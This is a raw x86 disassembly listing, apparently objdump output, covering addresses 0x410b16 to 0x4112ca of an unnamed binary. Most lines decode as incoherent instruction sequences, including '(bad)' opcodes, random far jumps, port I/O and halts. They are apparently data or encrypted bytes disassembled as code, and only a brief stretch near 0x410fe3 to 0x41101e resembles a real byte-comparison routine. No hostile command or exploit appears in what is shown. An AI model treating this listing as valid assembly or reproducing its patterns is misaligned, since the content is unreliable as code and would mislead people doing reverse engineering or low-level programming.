  410b16:	jo     0x410b3c
  410b18:	sbb    edx,eax
  410b1a:	into   
  410b1b:	push   ebx
  410b1c:	int    0x5c
  410b1e:	mov    BYTE PTR [eax],dh
  410b20:	mov    al,0x85
  410b22:	inc    ecx
  410b23:	in     eax,0xc4
  410b25:	cld    
  410b26:	push   0xebf7dfe7
  410b2b:	dec    esi
  410b2c:	jge    0x410b93
  410b2e:	es inc esp
  410b30:	test   esi,0x18f1c991
  410b36:	pop    eax
  410b37:	mov    bl,0xc9
  410b39:	loope  0x410ae4
  410b3b:	cmc    
  410b3c:	stos   BYTE PTR es:[edi],al
  410b3d:	add    bh,dl
  410b3f:	jg     0x410bbc
  410b41:	in     al,0x7a
  410b43:	xor    ebx,esi
  410b45:	neg    DWORD PTR [esi-0x542232ef]
  410b4b:	mov    ds:0x7a3a3622,eax
  410b50:	xchg   ecx,eax
  410b51:	mov    dl,0xc6
  410b53:	fwait
  410b54:	jp     0x410bab
  410b56:	and    eax,0x575ecbb5
  410b5b:	add    al,0xe4
  410b5d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410b5e:	pushf  
  410b5f:	call   0xaffdb663
  410b64:	js     0x410bc7
  410b66:	jb     0x410b84
  410b68:	scas   al,BYTE PTR es:[edi]
  410b69:	dec    ebx
  410b6a:	sub    eax,0x8917289
  410b6f:	outs   dx,DWORD PTR ds:[esi]
  410b70:	mov    ah,0x82
  410b72:	push   ecx
  410b73:	es and ebp,0x6f824465
  410b7a:	pop    esi
  410b7b:	mov    ss,WORD PTR [ecx-0x6840483f]
  410b81:	adc    DWORD PTR [ebx+0x7e],edx
  410b84:	xchg   ecx,eax
  410b85:	xor    esi,DWORD PTR [esi]
  410b87:	lds    si,DWORD PTR [esp+ebx*8]
  410b8b:	jne    0x410b9e
  410b8d:	xchg   ebp,eax
  410b8e:	jle    0x410b32
  410b90:	mov    bl,BYTE PTR [esi+0x1a682cb8]
  410b96:	sub    BYTE PTR [ebx],0xe2
  410b99:	imul   edi,edi,0xffffffce
  410b9c:	xor    cl,BYTE PTR ds:0x3d87854a
  410ba2:	imul   esp,eax,0x5c
  410ba5:	lods   al,BYTE PTR ds:[esi]
  410ba6:	popa   
  410ba7:	dec    ebx
  410ba8:	add    eax,0x90bee432
  410bad:	mov    dl,0x3
  410baf:	and    BYTE PTR [edi-0x71],dh
  410bb2:	dec    ecx
  410bb3:	adc    ebx,DWORD PTR fs:[edx-0x7eacb29d]
  410bba:	cmp    BYTE PTR [eax-0x60d07d27],0xd0
  410bc1:	mov    ds:0x9721745f,eax
  410bc6:	jae    0x410c22
  410bc8:	jmp    0x179d47bf
  410bcd:	push   esi
  410bce:	jl     0x410b66
  410bd0:	scas   eax,DWORD PTR es:[edi]
  410bd1:	mov    ds:0x567c0095,eax
  410bd6:	loopne 0x410c4d
  410bd8:	adc    eax,0x695a2d38
  410bdd:	pop    ebp
  410bde:	cmp    eax,0x7c9634e2
  410be3:	aaa    
  410be4:	ror    DWORD PTR [ebx-0xe],1
  410be7:	(bad)  
  410be8:	(bad)  
  410be9:	into   
  410bea:	mov    di,?
  410bed:	les    esp,FWORD PTR [ebp+0x60edcf9c]
  410bf3:	cmp    eax,0x680143e8
  410bf8:	fmul   st(6),st
  410bfa:	fnstenv [ecx+0x6dce9d5e]
  410c00:	popa   
  410c01:	js     0x410b9d
  410c03:	in     al,dx
  410c04:	adc    eax,0xe4981e49
  410c09:	push   ebx
  410c0a:	aas    
  410c0b:	xor    al,0x3d
  410c0d:	fisttp DWORD PTR [ebp-0x72]
  410c10:	ja     0x410c12
  410c12:	mov    ebp,0x775049e4
  410c17:	mov    esp,DWORD PTR [ebx]
  410c19:	xchg   esp,eax
  410c1a:	jmp    0x410bca
  410c1c:	test   eax,0x1d70fb30
  410c21:	shl    BYTE PTR [eax],0x3f
  410c24:	mov    fs,WORD PTR [di]
  410c27:	inc    ecx
  410c28:	fmul   QWORD PTR [ebx+esi*4]
  410c2b:	push   0x993755f1
  410c30:	cmp    al,0xb
  410c32:	imul   edx,esp,0x1d
  410c35:	hlt    
  410c36:	jg     0x410c2e
  410c38:	cwde   
  410c39:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410c3a:	in     eax,0x62
  410c3c:	add    BYTE PTR [ebp+0x5d],0x57
  410c40:	icebp  
  410c41:	enter  0x8b53,0xa7
  410c45:	das    
  410c46:	sub    BYTE PTR [ebp-0x7e],bl
  410c49:	mov    ebx,DWORD PTR [eax-0xa]
  410c4c:	lea    esi,[ebp-0x45da67b2]
  410c52:	mov    esi,0x48728cb
  410c57:	mov    al,ds:0x6efbc17d
  410c5c:	dec    cx
  410c5e:	jg     0x410c65
  410c60:	les    esi,FWORD PTR [ecx+eiz*2-0x62c36947]
  410c67:	ins    DWORD PTR es:[edi],dx
  410c68:	push   es
  410c69:	lods   eax,DWORD PTR ds:[esi]
  410c6a:	das    
  410c6b:	das    
  410c6c:	pop    edx
  410c6d:	add    bl,al
  410c6f:	mov    ds:0x103bf6b9,al
  410c74:	inc    eax
  410c75:	jmp    0xe2397eaf
  410c7a:	push   es
  410c7b:	ror    BYTE PTR [edi-0x7304dd89],1
  410c81:	push   ss
  410c82:	ins    BYTE PTR es:[edi],dx
  410c83:	adc    dl,0x5a
  410c86:	pop    ds
  410c87:	pop    eax
  410c88:	add    DWORD PTR ds:0x6734d9e0,ebp
  410c8e:	cmp    BYTE PTR [ebx+0x6],cl
  410c91:	cmc    
  410c92:	aaa    
  410c93:	fucomp st(3)
  410c95:	or     DWORD PTR [esp+ecx*4+0x3a],esp
  410c99:	dec    ebp
  410c9a:	xor    al,0x2
  410c9c:	je     0x410c73
  410c9e:	sbb    dl,bh
  410ca0:	jno    0x410ccf
  410ca2:	popa   
  410ca3:	jns    0x410d09
  410ca5:	ss lds esi,FWORD PTR gs:[ebx+0x1a25e953]
  410cad:	jmp    0x89c4:0x9655b051
  410cb4:	fbld   TBYTE PTR [ebp+0x11]
  410cb7:	neg    BYTE PTR [edi-0x42]
  410cba:	psubq  mm7,QWORD PTR [edi]
  410cbd:	out    0x25,al
  410cbf:	ret    
  410cc0:	xchg   edx,eax
  410cc1:	push   edx
  410cc2:	sti    
  410cc3:	adc    al,0xd7
  410cc5:	push   es
  410cc6:	sub    al,0x77
  410cc8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410cc9:	test   al,0xe6
  410ccb:	mov    bh,0xb8
  410ccd:	jne    0x410cc6
  410ccf:	scas   eax,DWORD PTR es:[edi]
  410cd0:	dec    edx
  410cd1:	int3   
  410cd2:	sti    
  410cd3:	xchg   esp,eax
  410cd4:	pminsw mm6,QWORD PTR [ebx+ebp*8]
  410cd8:	push   es
  410cd9:	jmp    0x59f94e40
  410cde:	push   cs
  410cdf:	mov    edi,esi
  410ce1:	or     DWORD PTR [eax-0x42150a74],esp
  410ce7:	sub    eax,0x45e3ccf0
  410cec:	bound  edi,QWORD PTR [esi+0x2d]
  410cef:	js     0x410cf0
  410cf1:	cmp    ebp,DWORD PTR [edx+ecx*1]
  410cf4:	jmp    0x4206:0x7b30934e
  410cfb:	xor    al,0x1f
  410cfd:	xor    eax,0xbb418f64
  410d02:	outs   dx,DWORD PTR ds:[esi]
  410d03:	pop    edi
  410d04:	xor    al,0x8
  410d06:	mov    ebx,0x8c19c50b
  410d0b:	inc    edx
  410d0c:	mov    DWORD PTR [edx],eax
  410d0e:	mov    eax,DWORD PTR [ebp-0x8]
  410d11:	jmp    0x410fdf
  410d16:	je     0x410d40
  410d18:	(bad)  
  410d19:	push   cs
  410d1a:	push   edx
  410d1b:	lock je 0x410d8e
  410d1e:	outs   dx,BYTE PTR ds:[esi]
  410d1f:	dec    ecx
  410d20:	mov    edi,0x1f06939c
  410d25:	shr    ebx,1
  410d27:	mov    eax,0x7caf7e7e
  410d2c:	jle    0x410dac
  410d2e:	pop    edx
  410d2f:	lock shl BYTE PTR [ebp+0x2cbdbcd3],cl
  410d36:	mov    ebp,0x105cd5a6
  410d3b:	dec    ebp
  410d3c:	sub    DWORD PTR [eax+0x0],edi
  410d3f:	dec    esi
  410d40:	mov    BYTE PTR [esi+0x3a],0xcf
  410d44:	inc    esp
  410d45:	and    eax,DWORD PTR [edx-0xf5bf82]
  410d4b:	mov    dh,0x71
  410d4d:	inc    esp
  410d4e:	mov    cl,0x2f
  410d50:	push   ds
  410d51:	xor    DWORD PTR [eax+ebx*4+0x42348a8f],esp
  410d58:	jno    0x410d0f
  410d5a:	mov    edi,0xf5190546
  410d5f:	mov    edi,0x6fbcc670
  410d64:	leave  
  410d65:	imul   ebp,DWORD PTR [ecx-0x7c992c0d],0xfffffff3
  410d6c:	inc    esp
  410d6d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410d6e:	add    eax,0xdc0d8dc1
  410d73:	jle    0x410cfe
  410d75:	clc    
  410d76:	push   ebx
  410d77:	xor    eax,0x168a634b
  410d7c:	and    al,0x54
  410d7e:	retf   0xa4d3
  410d81:	loope  0x410dc8
  410d83:	mov    ch,BYTE PTR [edx-0x5057b0b6]
  410d89:	dec    ebx
  410d8a:	inc    eax
  410d8b:	outs   dx,DWORD PTR ds:[esi]
  410d8c:	add    BYTE PTR [esi+0x33],bl
  410d8f:	inc    edx
  410d90:	sbb    eax,0xb7155586
  410d95:	xchg   edi,eax
  410d96:	or     eax,0x4a4d02b8
  410d9b:	mov    esi,eax
  410d9d:	retf   
  410d9e:	imul   ebp,DWORD PTR [ebx],0xffffffd4
  410da1:	popf   
  410da2:	clc    
  410da3:	call   0x4d8:0xc3ff968f
  410daa:	lahf   
  410dab:	mov    esi,ecx
  410dad:	cmp    ebp,ebx
  410daf:	addr16 push eax
  410db1:	jmp    FWORD PTR [ebx+eiz*1]
  410db4:	test   eax,0x4f705fc4
  410db9:	gs xor al,ch
  410dbc:	or     cl,BYTE PTR [eax]
  410dbe:	ins    DWORD PTR es:[edi],dx
  410dbf:	aas    
  410dc0:	int3   
  410dc1:	outs   dx,BYTE PTR ds:[esi]
  410dc2:	retf   
  410dc3:	xor    eax,0x8a43d864
  410dc8:	nop
  410dc9:	push   ebx
  410dca:	mov    bl,0x8d
  410dcc:	not    esi
  410dce:	retf   0xd523
  410dd1:	push   ds
  410dd2:	cmp    al,bh
  410dd4:	stc    
  410dd5:	or     dh,BYTE PTR [esi+0x6e4d0f45]
  410ddb:	jb     0x410df9
  410ddd:	arpl   WORD PTR [ebx-0x45],bx
  410de0:	int3   
  410de1:	mov    bh,0x82
  410de3:	push   es
  410de4:	adc    bl,BYTE PTR [edi-0x75f85907]
  410dea:	cli    
  410deb:	call   0x8a60:0xf5fa89be
  410df2:	leave  
  410df3:	cli    
  410df4:	std    
  410df5:	retf   0x13d3
  410df8:	in     eax,dx
  410df9:	sub    BYTE PTR [esi],bh
  410dfb:	retf   0x5622
  410dfe:	out    dx,al
  410dff:	jmp    0xd923d537
  410e04:	and    esi,ecx
  410e06:	adc    DWORD PTR [eax+ecx*1],edi
  410e09:	adc    dl,BYTE PTR [eax]
  410e0b:	inc    BYTE PTR [ecx-0x1a65cd9c]
  410e11:	push   ebp
  410e12:	rcr    DWORD PTR [ebx],cl
  410e14:	je     0x410da4
  410e16:	lods   eax,DWORD PTR ds:[esi]
  410e17:	data16 hlt 
  410e19:	pop    ecx
  410e1a:	dec    edi
  410e1b:	xor    eax,0x8e97a010
  410e20:	cli    
  410e21:	pushf  
  410e22:	jnp    0x410dff
  410e24:	xor    ebp,0x92d0db69
  410e2a:	jp     0x410e0b
  410e2c:	clc    
  410e2d:	push   esi
  410e2e:	sbb    BYTE PTR ss:[ecx+0x64],dl
  410e32:	outs   dx,BYTE PTR ds:[esi]
  410e33:	sar    esp,cl
  410e35:	xchg   edi,eax
  410e36:	lahf   
  410e37:	push   ecx
  410e38:	int3   
  410e39:	xchg   DWORD PTR [edx-0x35],edi
  410e3c:	cs add eax,0x8d6d0cf5
  410e42:	fsubr  QWORD PTR [edx-0x68d9e3e5]
  410e48:	sti    
  410e49:	pop    ds
  410e4a:	out    dx,al
  410e4b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410e4c:	jge    0x410e33
  410e4e:	pop    esp
  410e4f:	adc    eax,0xffffff83
  410e52:	dec    edx
  410e53:	lods   eax,DWORD PTR ds:[esi]
  410e54:	mov    al,ds:0x414ff860
  410e59:	dec    edx
  410e5a:	mov    al,0xcf
  410e5c:	test   DWORD PTR [edx+0x6ff4cd72],0xcbf9c7de
  410e66:	xchg   BYTE PTR [ecx],dh
  410e68:	mov    WORD PTR [esi],ss
  410e6a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410e6b:	jb     0x410e72
  410e6d:	shr    DWORD PTR ds:0x30380d56,0xd7
  410e74:	inc    esp
  410e75:	adc    esi,edi
  410e77:	dec    esi
  410e78:	xor    eax,0xdd0831aa
  410e7d:	xchg   edx,eax
  410e7e:	out    dx,al
  410e7f:	imul   ebp,DWORD PTR [eax+eax*1-0x1eebfafa],0x24
  410e87:	and    DWORD PTR [edi+0x1f78677],0x8e872c1d
  410e91:	push   esp
  410e92:	in     al,dx
  410e93:	xor    eax,0xd6205681
  410e98:	mov    esi,0xe8c16485
  410e9d:	xchg   esp,eax
  410e9e:	xor    edx,0x43cf86d1
  410ea4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410ea5:	adc    al,0xe3
  410ea7:	xchg   esp,eax
  410ea8:	mov    edi,0x29b05a4d
  410ead:	out    dx,al
  410eae:	data16 sbb ah,al
  410eb1:	sbb    BYTE PTR [ecx-0x2a],ah
  410eb4:	fld    QWORD PTR [ebx]
  410eb6:	retf   0xeb09
  410eb9:	retf   0xfda4
  410ebc:	adc    ebp,DWORD PTR [edi+0x4f]
  410ebf:	sub    eax,0xffc3cd98
  410ec4:	lods   eax,DWORD PTR ds:[esi]
  410ec5:	fst    QWORD PTR [ebp+0xa069996]
  410ecb:	mov    ebx,0xb75b50d1
  410ed0:	repnz or eax,0x48a825aa
  410ed6:	stos   DWORD PTR es:[edi],eax
  410ed7:	arpl   cx,dx
  410ed9:	jnp    0x410efa
  410edb:	test   DWORD PTR [ebx],eax
  410edd:	popa   
  410ede:	fmul   QWORD PTR [eax]
  410ee0:	inc    ebp
  410ee1:	push   esp
  410ee2:	xor    edx,ebx
  410ee4:	dec    edx
  410ee5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410ee6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410ee7:	mov    bh,0x64
  410ee9:	push   0xb2268c07
  410eee:	xor    al,0xaa
  410ef0:	jp     0x410e90
  410ef2:	mov    dh,0x85
  410ef4:	sbb    al,0x95
  410ef6:	fcomp  DWORD PTR [eax+ebx*8+0x66fa8b3]
  410efd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410efe:	ds mov ah,0xf5
  410f01:	xor    al,BYTE PTR [eax-0x1cef42b6]
  410f07:	sub    DWORD PTR [edx+ecx*4],0xe7351954
  410f0e:	cmp    al,0x44
  410f10:	and    cl,ch
  410f12:	fdiv   QWORD PTR [eax-0x9af48d8]
  410f18:	jmp    0xa07402a9
  410f1d:	out    dx,al
  410f1e:	ins    BYTE PTR es:[edi],dx
  410f1f:	idiv   DWORD PTR [ecx]
  410f21:	push   esi
  410f22:	and    ch,bl
  410f24:	dec    esi
  410f25:	(bad)  
  410f26:	loop   0x410eee
  410f28:	ja     0x410f43
  410f2a:	add    DWORD PTR [ebp+esi*4+0x1dce6c50],edi
  410f31:	out    dx,eax
  410f32:	pop    es
  410f33:	push   edi
  410f34:	pop    esp
  410f35:	adc    al,0xb7
  410f37:	out    0xa8,eax
  410f39:	mov    dh,0xc2
  410f3b:	xlat   BYTE PTR ds:[ebx]
  410f3c:	aam    0xbe
  410f3e:	(bad)  
  410f3f:	mov    bl,0x56
  410f41:	fbld   TBYTE PTR [ebp-0x42]
  410f44:	pop    ebp
  410f45:	lahf   
  410f46:	push   0x27
  410f48:	push   0x48a27bef
  410f4d:	icebp  
  410f4e:	add    al,0x26
  410f50:	adc    al,0xfa
  410f52:	inc    ebx
  410f53:	outs   dx,DWORD PTR ds:[esi]
  410f54:	inc    esi
  410f55:	aas    
  410f56:	dec    ebp
  410f57:	and    ebp,DWORD PTR [ebp-0x1f]
  410f5a:	mov    ebx,0x46cda841
  410f5f:	ret    0x2203
  410f62:	retf   0x2b77
  410f65:	dec    edx
  410f66:	rcl    DWORD PTR [ebx-0x1f8cae4f],cl
  410f6c:	or     eax,0xdf8fdeb
  410f71:	mov    eax,ds:0x2765de2a
  410f76:	mov    dl,0x6
  410f78:	mov    ch,0xed
  410f7a:	ins    DWORD PTR es:[edi],dx
  410f7b:	daa    
  410f7c:	repnz test BYTE PTR [edx+0xd716877],bh
  410f83:	mov    eax,0xd7b5bd57
  410f88:	out    dx,eax
  410f89:	add    BYTE PTR [esi+0x6a],ah
  410f8c:	xchg   ecx,eax
  410f8d:	hlt    
  410f8e:	loopne 0x410ff5
  410f90:	ret    
  410f91:	mov    ebx,0x49995d77
  410f96:	or     eax,0xd83402dd
  410f9b:	push   ds
  410f9c:	jp     0x410fda
  410f9e:	jbe    0x411008
  410fa0:	push   0xab05ae86
  410fa5:	and    esp,DWORD PTR [ebp-0x7716e11c]
  410fab:	jb     0x410f64
  410fad:	mov    WORD PTR [ebp-0x23],cs
  410fb0:	push   0x653a86a9
  410fb5:	push   ebx
  410fb6:	leave  
  410fb7:	ins    DWORD PTR es:[edi],dx
  410fb8:	mov    ebp,0x674161bd
  410fbd:	xlat   BYTE PTR ds:[ebx]
  410fbe:	mov    WORD PTR [ebx-0x8],?
  410fc1:	aad    0x7f
  410fc3:	mov    ?,WORD PTR [ebx+edi*1+0x72]
  410fc7:	jecxz  0x410f8c
  410fc9:	arpl   WORD PTR [edi],cx
  410fcb:	ins    DWORD PTR es:[edi],dx
  410fcc:	out    dx,al
  410fcd:	lds    ecx,FWORD PTR [edi-0x11]
  410fd0:	inc    eax
  410fd1:	loop   0x410f60
  410fd3:	sahf   
  410fd4:	addr16 push ebp
  410fd6:	daa    
  410fd7:	push   ecx
  410fd8:	inc    ebp
  410fd9:	inc    ebp
  410fda:	xchg   edx,eax
  410fdb:	push   esi
  410fdc:	or     dh,BYTE PTR [edx+0x3c13350]
  410fe2:	(bad)  
  410fe3:	mov    DWORD PTR [ebp+0x8],eax
  410fe6:	mov    eax,DWORD PTR [ebp+0x8]
  410fe9:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  410fed:	mov    dl,BYTE PTR [ebp-0x1]
  410ff0:	cmp    al,dl
  410ff2:	je     0x411303
  410ff8:	mov    eax,DWORD PTR [ebp+0x8]
  410ffb:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  410fff:	mov    edx,DWORD PTR [ebp+0xc]
  411002:	cmp    al,BYTE PTR [edx]
  411004:	jne    0x4115f7
  41100a:	mov    eax,DWORD PTR [ebp-0x8]
  41100d:	mov    edx,DWORD PTR [ebp+0xc]
  411010:	movsx  edx,BYTE PTR [edx]
  411013:	xor    eax,ecx
  411015:	add    eax,esi
  411017:	cmp    edx,eax
  411019:	jmp    0x4112e7
  41101e:	jmp    0x411054
  411020:	push   esp
  411021:	dec    ebx
  411022:	push   ecx
  411023:	imul   esi,ecx,0xffffffb4
  411026:	and    DWORD PTR [edx-0x16],esi
  411029:	loope  0x41104c
  41102b:	or     ecx,DWORD PTR [eax-0x2d]
  41102e:	sbb    BYTE PTR [edi+0x7e],al
  411031:	jle    0x410fe2
  411033:	jl     0x4110b3
  411035:	jle    0x41100a
  411037:	mov    ecx,?
  411039:	test   eax,0x964136b9
  41103e:	push   esp
  41103f:	xor    al,0x41
  411041:	cdq    
  411042:	push   edi
  411043:	aad    0xc0
  411045:	xchg   ebx,eax
  411046:	int3   
  411047:	sar    BYTE PTR [edx+0x7d59a3b5],1
  41104d:	sub    esi,DWORD PTR [ecx+0x25065e6]
  411053:	in     eax,dx
  411054:	jo     0x411081
  411056:	outs   dx,DWORD PTR ds:[esi]
  411057:	push   ecx
  411058:	enter  0xdea2,0x9
  41105c:	sbb    eax,0x57a45b2e
  411061:	imul   eax,DWORD PTR [eax],0xffffffb8
  411064:	daa    
  411065:	jae    0x4110dd
  411067:	lods   eax,DWORD PTR ds:[esi]
  411068:	sti    
  411069:	dec    esi
  41106a:	ror    dh,cl
  41106c:	mov    ecx,0xb16eb287
  411071:	cwde   
  411072:	out    0x12,eax
  411074:	cmp    ah,cl
  411076:	mov    edx,0x16da42f9
  41107b:	xor    eax,0x917c6753
  411080:	or     eax,DWORD PTR [ebx]
  411082:	mov    DWORD PTR [edx-0x307ed178],ebp
  411088:	call   0x2f347430
  41108d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41108e:	rcl    BYTE PTR [ecx-0x6e],cl
  411091:	xchg   esi,eax
  411092:	test   ebp,ebp
  411094:	mov    WORD PTR [eax+ebp*8],es
  411097:	jns    0x4110b1
  411099:	sub    eax,DWORD PTR [ecx+0x110d1a17]
  41109f:	shufps xmm4,XMMWORD PTR [edi-0x612d2b97],0x52
  4110a7:	jns    0x41104c
  4110a9:	fnstenv [edx-0xe]
  4110ac:	in     al,dx
  4110ad:	mov    BYTE PTR [esi-0x899629d],ah
  4110b3:	pop    es
  4110b4:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  4110b6:	es aad 0x2d
  4110b9:	jecxz  0x4110f9
  4110bb:	xchg   ebx,eax
  4110bc:	xchg   edi,eax
  4110bd:	push   esp
  4110be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4110bf:	jp     0x411061
  4110c1:	hlt    
  4110c2:	mov    edx,0xb761f405
  4110c7:	(bad)  
  4110c8:	rcl    ah,0x9d
  4110cb:	enter  0x815b,0xef
  4110cf:	pop    eax
  4110d0:	xchg   edi,eax
  4110d1:	cld    
  4110d2:	mov    ds:0x2aaa8a93,al
  4110d7:	dec    esp
  4110d9:	mov    esi,0x8d796f3f
  4110de:	fistp  DWORD PTR [ecx-0x4b]
  4110e1:	addr16 sti 
  4110e3:	in     eax,0xd8
  4110e5:	clc    
  4110e6:	mov    al,ds:0xe2d3c30c
  4110eb:	mov    eax,DWORD PTR [ecx]
  4110ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4110ee:	jo     0x4110bc
  4110f0:	aas    
  4110f1:	in     al,dx
  4110f2:	out    0xa0,eax
  4110f4:	pop    ds
  4110f5:	inc    edx
  4110f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4110f7:	push   ebx
  4110f8:	xchg   BYTE PTR gs:[edx+eax*2],bl
  4110fc:	(bad)  
  4110fd:	xor    ecx,ecx
  4110ff:	cmp    DWORD PTR [edx+edi*4+0x5d],eax
  411103:	pusha  
  411104:	add    ah,BYTE PTR [ebp+0x24]
  411107:	jl     0x411145
  411109:	(bad)  
  41110a:	iret   
  41110b:	mov    ah,0x91
  41110d:	and    al,0x31
  41110f:	add    eax,0x8abb914e
  411114:	jmp    0x3b53:0x9198f7c0
  41111b:	xor    al,0xcf
  41111d:	rsqrtps xmm6,XMMWORD PTR [eax+edi*1+0x69594450]
  411125:	je     0x4110c5
  411127:	push   cs
  411128:	or     BYTE PTR [ebx-0x43812d56],0x4b
  41112f:	or     eax,0xa69b3cfa
  411134:	dec    ecx
  411135:	inc    ebx
  411136:	xor    bl,dl
  411138:	and    DWORD PTR [edi-0x45e61c7],esi
  41113e:	lods   al,BYTE PTR ds:[esi]
  41113f:	es scas eax,DWORD PTR es:[edi]
  411141:	sub    bh,BYTE PTR ds:0x9dc4e5ad
  411147:	inc    ecx
  411148:	stos   DWORD PTR es:[edi],eax
  411149:	mov    al,ds:0xc2cf4206
  41114e:	inc    ebp
  41114f:	or     BYTE PTR [esi],ah
  411151:	scas   al,BYTE PTR es:[edi]
  411152:	push   0xffffffb5
  411154:	cld    
  411155:	pushf  
  411156:	push   ecx
  411157:	inc    esp
  411158:	xchg   edx,eax
  411159:	nop
  41115a:	(bad)  
  41115b:	(bad)  [edi]
  41115d:	je     0x41119a
  41115f:	pop    ebp
  411160:	cmp    BYTE PTR [ecx+eiz*2-0x5c],bh
  411164:	inc    edi
  411165:	retf   0x381f
  411168:	retf   
  411169:	ret    
  41116a:	ss xchg ebx,eax
  41116c:	adc    al,BYTE PTR [esi+0x62]
  41116f:	mov    al,ds:0x2b8b903d
  411174:	scas   eax,DWORD PTR es:[edi]
  411175:	ja     0x41111d
  411177:	and    al,0x84
  411179:	add    cl,BYTE PTR [ecx-0x4c08b462]
  41117f:	rcl    DWORD PTR [ecx+0x55cd5ffd],1
  411185:	les    edi,FWORD PTR [eax]
  411187:	jns    0x4111ab
  411189:	aad    0x9d
  41118b:	div    ebp
  41118d:	mul    BYTE PTR ds:0xd3885e19
  411193:	fisttp QWORD PTR [ecx]
  411195:	in     eax,0x91
  411197:	arpl   WORD PTR [ecx+ecx*4-0x37],cx
  41119b:	pop    edi
  41119c:	(bad)  
  41119d:	pop    ss
  41119e:	lock lea esp,[ecx+0x18]
  4111a2:	rcr    DWORD PTR [esi],1
  4111a4:	dec    edx
  4111a5:	jle    0x4111f8
  4111a7:	int3   
  4111a8:	fisub  DWORD PTR [ebp+0x39]
  4111ab:	cmp    ecx,DWORD PTR [ebx-0x7fc577da]
  4111b1:	ret    
  4111b2:	sub    esp,DWORD PTR [ebp+0x18934159]
  4111b8:	daa    
  4111b9:	rol    BYTE PTR ds:0xd8ac4850,0x13
  4111c0:	fs repnz int3 
  4111c3:	mov    edx,edx
  4111c5:	or     eax,0x6e6ce16c
  4111ca:	xchg   esi,eax
  4111cb:	pop    ss
  4111cc:	and    ah,BYTE PTR [ecx+edx*8-0x70]
  4111d0:	fdivr  QWORD PTR [ebp-0x9]
  4111d3:	sbb    al,0x28
  4111d5:	(bad)  
  4111d7:	push   DWORD PTR [eax-0x4ebda7f8]
  4111dd:	pop    ebp
  4111de:	lahf   
  4111df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4111e0:	xchg   edi,eax
  4111e1:	shl    DWORD PTR [esi+0x1c7bfa5b],cl
  4111e7:	loope  0x411227
  4111e9:	loope  0x411190
  4111eb:	mov    bh,0xd5
  4111ed:	inc    edx
  4111ee:	xchg   dl,bh
  4111f0:	fwait
  4111f1:	rcl    BYTE PTR [esi+0x442602db],0x8f
  4111f8:	xor    ebp,DWORD PTR [ebx-0x5c26bf5b]
  4111fe:	dec    edx
  4111ff:	push   ecx
  411200:	sbb    eax,DWORD PTR gs:[edi+esi*8]
  411204:	sub    BYTE PTR ss:[edi+edi*8-0x59],dh
  411209:	inc    edx
  41120a:	jnp    0x4111b7
  41120c:	cmp    ecx,DWORD PTR [ebp+0x16e30173]
  411212:	ror    ch,1
  411214:	nop
  411215:	cmc    
  411216:	in     eax,dx
  411217:	pusha  
  411218:	sub    ah,BYTE PTR [ebx+0x318e1994]
  41121e:	test   DWORD PTR [esi-0x634255cf],edi
  411224:	(bad)  
  411225:	jmp    0xb841:0x8f7fd871
  41122c:	adc    ebp,DWORD PTR [ebx+ebx*8-0xe]
  411230:	les    ebp,FWORD PTR [ebx]
  411232:	retf   
  411233:	idiv   BYTE PTR [ecx]
  411235:	dec    esp
  411236:	sahf   
  411237:	sahf   
  411238:	sub    ebx,DWORD PTR [edx+0x382db331]
  41123e:	add    BYTE PTR [ebp-0x6c],bl
  411241:	outs   dx,DWORD PTR ds:[esi]
  411242:	shl    BYTE PTR [ebp+0x49],0x26
  411246:	pop    DWORD PTR [ebp-0x25]
  411249:	sbb    edx,DWORD PTR [eax-0x45]
  41124c:	(bad)  
  41124d:	call   0x5019:0x86656f95
  411254:	in     al,0x88
  411256:	(bad)  
  411257:	stc    
  411258:	dec    edi
  411259:	int3   
  41125a:	and    eax,0xe32bf8fd
  41125f:	clc    
  411260:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411261:	mov    al,0xc1
  411263:	dec    ecx
  411264:	add    BYTE PTR [ecx+eiz*8-0x469a79c5],al
  41126b:	test   dh,bl
  41126d:	sub    BYTE PTR [ecx+esi*1],bh
  411270:	push   0xffffffaf
  411272:	xchg   DWORD PTR [ecx],esi
  411274:	icebp  
  411275:	jb     0x4112be
  411277:	fld    DWORD PTR [esi]
  411279:	aam    0x7b
  41127b:	add    DWORD PTR [ebp+0x72],ebx
  41127e:	mov    edi,0x7f8f77f7
  411283:	xchg   esi,eax
  411284:	cli    
  411285:	rol    BYTE PTR [edx],cl
  411287:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411288:	retf   
  411289:	outs   dx,BYTE PTR fs:[esi]
  41128b:	mov    ds:0x8f18d8f5,eax
  411290:	jge    0x411212
  411292:	ds push cs
  411294:	stos   BYTE PTR es:[edi],al
  411295:	jo     0x4112c9
  411297:	sbb    BYTE PTR [edi],dl
  411299:	pop    es
  41129a:	dec    ebx
  41129b:	mov    al,ds:0xec40a2b0
  4112a0:	test   DWORD PTR [esi+0x1c4657b],edi
  4112a6:	inc    esi
  4112a7:	mov    bl,0xd
  4112a9:	data16 aas 
  4112ab:	leave  
  4112ac:	test   DWORD PTR [edi+0x268d592],edx
  4112b2:	xchg   edx,eax
  4112b3:	sbb    BYTE PTR [ebx+0x2f],dl
  4112b6:	clc    
  4112b7:	les    esp,FWORD PTR [ecx]
  4112b9:	loopne 0x411286
  4112bb:	push   ecx
  4112bc:	jo     0x411263
  4112be:	adc    eax,ecx
  4112c0:	mov    ecx,0x6aaa6c7d
  4112c5:	pushf  
  4112c6:	inc    ebp
  4112c7:	sub    esi,DWORD PTR [ecx-0x12]
  4112ca:	inc    esi
